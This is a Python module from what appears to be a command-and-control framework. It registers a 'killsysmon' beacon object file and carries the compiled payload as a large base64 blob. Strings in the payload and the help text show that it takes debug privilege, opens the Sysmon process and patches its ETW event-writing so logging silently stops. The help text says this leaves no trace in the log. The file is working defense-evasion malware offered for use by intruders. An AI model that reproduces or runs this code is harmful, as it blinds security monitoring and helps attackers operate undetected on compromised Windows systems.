import base64
from typing import List

# BOF imports
from core.gunnershell.bofs.base import Bof, register

from colorama import Style, Fore
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
reset = Style.RESET_ALL

@register("killsysmon")
class KillSysMonBof(Bof):
	base64bof: str = "ZIYHAAAAAADgCgAANgAAAAAABAAudGV4dAAAAAAAAAAAAAAAwAQAACwBAADoBwAAAAAAADEAAAAgAFBgLmRhdGEAAAAAAAAAAAAAACAAAADsBQAAAAAAAAAAAAAAAAAAQABQwC5ic3MAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAUMAueGRhdGEAAAAAAAAAAAAAcAAAAAwGAAAAAAAAAAAAAAAAAABAADBALnBkYXRhAAAAAAAAAAAAAGwAAAB8BgAA0gkAAAAAAAAbAAAAQAAwQC5yZGF0YQAAAAAAAAAAAADgAAAA6AYAAAAAAAAAAAAAAAAAAEAAUEAvNAAAAAAAAAAAAAAAAAAAIAAAAMgHAAAAAAAAAAAAAAAAAABAAFBASIPsKLoBAAAAuQAgAAD/FQAAAABmxwUGAAAAAABIiQUQAAAAuAEAAABIg8Qow1dTSIPsKEiLFRAAAABED7cFCAAAAInLMcn/FQAAAABIixUQAAAAuQAIAAAxwGbHBQYAAAAAAEiJ1/Orhdt0EkiJ0f8VAAAAADHASIkFEAAAAEiDxChbX8NBVkFVQVRVV1ZTSIPsMEiDPQ8AAAAASIlUJHhIic1MiYQkgAAAAEyJjCSIAAAAD4TUAAAATI1sJHhMiWwkKEyJ6v8VAAAAAInDhcAPiLcAAABIY/BMiyUAAAAAQf/USP/GuggAAABIicFJifD/FQAAAABIicdIhcAPhIoAAABNielJiehIifJIicH/FQAAAABIif1BvQAgAACF234tD7cVCAAAAESJ6CnQSInRhcB/LTHJ6PH+//8PtxUIAAAARInoKdBIidGFwH8TQf/USYn4MdJIicH/FQAAAADrKznDSInqD07DSAMNEAAAAExj8E2J8EwB9UQp8/8VAAAAAGZEATUIAAAA65FIg8QwW15fXUFcQV1BXsNBVFVXVlNIg+xAMcAx0kGDyf9MiyUAAAAASInOMcmJVCQoMdJJifBIiUwkILnp/QAASIlEJDhIiUQkMEH/1EiLLQAAAACJx//VTGPHuggAAABIicH/FQAAAABFMcBBg8n/MdJMiUQkOEiJw7np/QAATIlEJDBJifCJfCQoSIlEJCBB/9SFwHUXSIXbdBD/1UmJ2DHSSInB/xUAAAAAMdtIidhIg8RAW15fXUFcw0FUVVdWU0iD7DAxwDHSQYPJ/0yLJQAAAABJichIiVQkIEiJzjHSuen9AACJRCQoQf/USIstAAAAAInH/9VMY8e6CAAAAE0BwEiJwf8VAAAAAEGDyf8x0ol8JChIiUQkIEiJw0mJ8Lnp/QAAQf/UhcB1F0iF23QQ/9VJidgx0kiJwf8VAAAAADHbSInYSIPEMFteX11BXMPDVlNIg+xYSInOidP/FQAAAABMjUQkMLogAAAASInB/xUAAAAAhcB1BDHA62wxyUyNRCQ4SIny/xUAAAAAhcB06EiLRCQ4SItMJDBMjUQkQMdEJEABAAAAQbkQAAAASIlEJEQxwIXbD5XAMdIBwIlEJEwxwEiJRCQoSIlEJCD/FQAAAACFwHSh/xUAAAAAPRQFAAAPlcAPtsBIg8RYW17DVlNIg+xYSLhFdHdFdmVudEiJRCRCSInLSI0NAAAAAEi4bnRXcml0ZQBIiUQkSP8VAAAAAEiNVCRCSInB/xUAAAAAQbkFAAAASInZTI1EJD1IicYxwMZEJEEASInyx0QkPUgzwMNIiUQkIP8VAAAAAEG4ABAAAEiJ8kiJ2f8VAAAAADHASIPEWFtew1ZTSIPsWEiNXCQ4QYnQSInKSInZ/xUAAAAASInZ/xUAAAAAugEAAABIjQ0KAAAAiUQkLOie/v//SIs1AAAAAESLRCQsSI0VGwAAAIXAdEhFhcB0PDHSuToEAAD/FQAAAABIicNIhcB0HkiJwegE////MclIjRVFAAAA/9ZIidn/FQAAAADrGEiNFW4AAADrB0iNFZ4AAAC5DQAAAP/WkEiDxFhbXsOQkJCQkJCQkJCQkJCQkAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQQBAARCAAABBgMABkICMAFwAAABDggADlIKMAlgCHAHUAbABNAC4AEKBgAKcgYwBWAEcANQAsABCgYAClIGMAVgBHADUALAAQAAAAEGAwAGogIwAWAAAAEGAwAGogIwAWAAAAEGAwAGogIwAWAAAAAAAAAuAAAAAAAAAC4AAACGAAAACAAAAIYAAACdAQAAFAAAAJ0BAABKAgAAKAAAAEoCAADhAgAAOAAAAOECAADiAgAASAAAAOICAACBAwAATAAAAIEDAAAMBAAAWAAAAAwEAACyBAAAZAAAAG50ZGxsLmRsbABTZURlYnVnUHJpdmlsZWdlAE5vdCBlbm91Z2ggcHJpdmlsZWdlcyB0byBzaWxlbmNlIFN5c21vbi4KAFsrXSBET05FISBTeXNtb24gc3VjY2Vzc2Z1bGx5IHNpbGVuY2VkIQoARmFpbGVkIHRvIG9wZW4gYSBoYW5kbGUgdG8gdGhlIFN5c21vbiBwcm9jZXNzIQoAUGxlYXNlIHNwZWNpZnkgdGhlIGNvcnJlY3QgcHJvY2VzcyBJRCBvZiB0aGUgU3lzbW9uIHNlcnZpY2UhCgAAAAAAR0NDOiAoR05VKSAxNC13aW4zMgAAAAAAAAAAAAAAAAAQAAAAHQAAAAQAFwAAAA4AAAAEACAAAAAOAAAABAA3AAAADgAAAAQAPwAAAA4AAAAEAEkAAAAeAAAABABQAAAADgAAAAQAXgAAAA4AAAAEAHIAAAAfAAAABAB7AAAADgAAAAQAlwAAAA4AAAAEAMkAAAAgAAAABADdAAAAIQAAAAQA9AAAACIAAAAEABIBAAAjAAAABAAmAQAADgAAAAQAQAEAAA4AAAAEAF0BAAAkAAAABABuAQAADgAAAAQAgAEAACUAAAAEAIgBAAAOAAAABACyAQAAJgAAAAQA3gEAACEAAAAEAPMBAAAiAAAABAA2AgAAJAAAAAQAXwIAACcAAAAEAH8CAAAhAAAABACXAgAAIgAAAAQAzQIAACQAAAAEAO8CAAAoAAAABAACAwAAKQAAAAQAGgMAACoAAAAEAGEDAAArAAAABABrAwAALAAAAAQAnAMAABYAAAAEALEDAAAtAAAABAC/AwAALgAAAAQA7QMAAC8AAAAEAP8DAAAwAAAABAAiBAAAMQAAAAQAKwQAADIAAAAEADcEAAAWAAAABABHBAAAMwAAAAQAUwQAABYAAAAEAGkEAAA0AAAABACCBAAAFgAAAAQAjQQAADUAAAAEAJYEAAAWAAAABACfBAAAFgAAAAQAAAAAAAwAAAADAAQAAAAMAAAAAwAIAAAAEgAAAAMADAAAAAwAAAADABAAAAAMAAAAAwAUAAAAEgAAAAMAGAAAAAwAAAADABwAAAAMAAAAAwAgAAAAEgAAAAMAJAAAAAwAAAADACgAAAAMAAAAAwAsAAAAEgAAAAMAMAAAAAwAAAADADQAAAAMAAAAAwA4AAAAEgAAAAMAPAAAAAwAAAADAEAAAAAMAAAAAwBEAAAAEgAAAAMASAAAAAwAAAADAEwAAAAMAAAAAwBQAAAAEgAAAAMAVAAAAAwAAAADAFgAAAAMAAAAAwBcAAAAEgAAAAMAYAAAAAwAAAADAGQAAAAMAAAAAwBoAAAAEgAAAAMALmZpbGUAAAAAAAAA/v8AAGcBZW50cnkuYwAAAAAAAAAAAAAAYm9mc3RhcnQAAAAAAQAgAAIBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAuAAAAAQAgAAIAAAAAABsAAACGAAAAAQAgAAIAAAAAACsAAACdAQAAAQAgAAIAAAAAADcAAABKAgAAAQAgAAIAYm9mc3RvcADhAgAAAQAgAAIAAAAAAEMAAADiAgAAAQAgAAIAAAAAAFAAAACBAwAAAQAgAAIAZ28AAAAAAAAMBAAAAQAgAAIALnRleHQAAAAAAAAAAQAAAAMBsgQAADEAAAAAAAAAAAAAAAAALmRhdGEAAAAAAAAAAgAAAAMBGAAAAAAAAAAAAAAAAAAAAAAALmJzcwAAAAAAAAAAAwAAAAMBAAAAAAAAAAAAAAAAAAAAAAAALnhkYXRhAAAAAAAABAAAAAMBcAAAAAAAAAAAAAAAAAAAAAAALnBkYXRhAAAAAAAABQAAAAMBbAAAABsAAAAAAAAAAAAAAAAALnJkYXRhAAAAAAAABgAAAAMB3AAAAAAAAAAAAAAAAAAAAAAAAAAAAF0AAAAAAAAABwAAAAMBFAAAAAAAAAAAAAAAAAAAAAAAAAAAAGgAAAAIAAAAAgAAAAIAb3V0cHV0AAAQAAAAAgAAAAIAdHJhc2gAAAAAAAAAAgAAAAIAAAAAAHcAAAAAAAAAAAAAAAIAAAAAAIsAAAAAAAAAAAAAAAIAAAAAAJ4AAAAAAAAAAAAAAAIAAAAAALAAAAAAAAAAAAAAAAIAAAAAAMgAAAAAAAAAAAAAAAIAAAAAAOYAAAAAAAAAAAAAAAIAAAAAAP8AAAAAAAAAAAAAAAIAAAAAABYBAAAAAAAAAAAAAAIAAAAAAC4BAAAAAAAAAAAAAAIAAAAAAEIBAAAAAAAAAAAAAAIAAAAAAGUBAAAAAAAAAAAAAAIAAAAAAIgBAAAAAAAAAAAAAAIAAAAAAKkBAAAAAAAAAAAAAAIAAAAAAMkBAAAAAAAAAAAAAAIAAAAAAO4BAAAAAAAAAAAAAAIAAAAAABMCAAAAAAAAAAAAAAIAAAAAAC8CAAAAAAAAAAAAAAIAAAAAAEYCAAAAAAAAAAAAAAIAAAAAAFsCAAAAAAAAAAAAAAIAAAAAAH0CAAAAAAAAAAAAAAIAAAAAAKICAAAAAAAAAAAAAAIAAAAAALgCAAAAAAAAAAAAAAIAAAAAAMwCAAAAAAAAAAAAAAIAAAAAAN8CAAAAAAAAAAAAAAIAAAAAAPoCAAAAAAAAAAAAAAIAFQMAAC5yZGF0YSR6enoAcHJpbnRvdXRwdXQAaW50ZXJuYWxfcHJpbnRmAFV0ZjE2VG9VdGY4AFV0ZjhUb1V0ZjE2AFNldFByaXZpbGVnZQBTaWxlbnRTeXNtb24ALnJkYXRhJHp6egBjdXJyZW50b3V0c2l6ZQBfX2ltcF9NU1ZDUlQkY2FsbG9jAF9faW1wX0JlYWNvbk91dHB1dABfX2ltcF9NU1ZDUlQkZnJlZQBfX2ltcF9NU1ZDUlQkX3ZzY3ByaW50ZgBfX2ltcF9LRVJORUwzMiRHZXRQcm9jZXNzSGVhcABfX2ltcF9LRVJORUwzMiRIZWFwQWxsb2MAX19pbXBfTVNWQ1JUJHZzbnByaW50ZgBfX2ltcF9LRVJORUwzMiRIZWFwRnJlZQBfX2ltcF9NU1ZDUlQkbWVtY3B5AF9faW1wX0tFUk5FTDMyJFdpZGVDaGFyVG9NdWx0aUJ5dGUAX19pbXBfS0VSTkVMMzIkTXVsdGlCeXRlVG9XaWRlQ2hhcgBfX2ltcF9LRVJORUwzMiRHZXRDdXJyZW50UHJvY2VzcwBfX2ltcF9BZHZhcGkzMiRPcGVuUHJvY2Vzc1Rva2VuAF9faW1wX0FkdmFwaTMyJExvb2t1cFByaXZpbGVnZVZhbHVlQQBfX2ltcF9BZHZhcGkzMiRBZGp1c3RUb2tlblByaXZpbGVnZXMAX19pbXBfS0VSTkVMMzIkR2V0TGFzdEVycm9yAF9faW1wX0dldE1vZHVsZUhhbmRsZUEAX19pbXBfR2V0UHJvY0FkZHJlc3MAX19pbXBfS0VSTkVMMzIkV3JpdGVQcm9jZXNzTWVtb3J5AF9faW1wX0tFUk5FTDMyJEZsdXNoSW5zdHJ1Y3Rpb25DYWNoZQBfX2ltcF9CZWFjb25EYXRhUGFyc2UAX19pbXBfQmVhY29uRGF0YUludABfX2ltcF9CZWFjb25QcmludGYAX19pbXBfS0VSTkVMMzIkT3BlblByb2Nlc3MAX19pbXBfS0VSTkVMMzIkQ2xvc2VIYW5kbGUA"

	def help_menu():
		menu = """
Silence the Sysmon service by patching its capability to write ETW events to the log.
Restarting the Sysmon service or the system itself will clear the patch and Sysmon will resume working normally.
Altough this will not leave any traces in the log, there will be a time gap between the last and first new event.

Usage: bofexec killsysmon -i <Sysmon PID>
"""
		print(brightgreen + menu + reset)
		return

	@staticmethod
	def check_args(zargs: List[str] | None, Zargs: List[str] | None, int16: List[int] | None = None, int32: List[int] | None = None) -> list[str]:
		int32 = int32 or []
		extra: List[int] = []
		if len(int32) < 2:
			extra.append(f"-i:{int32[0]}")
		return extra
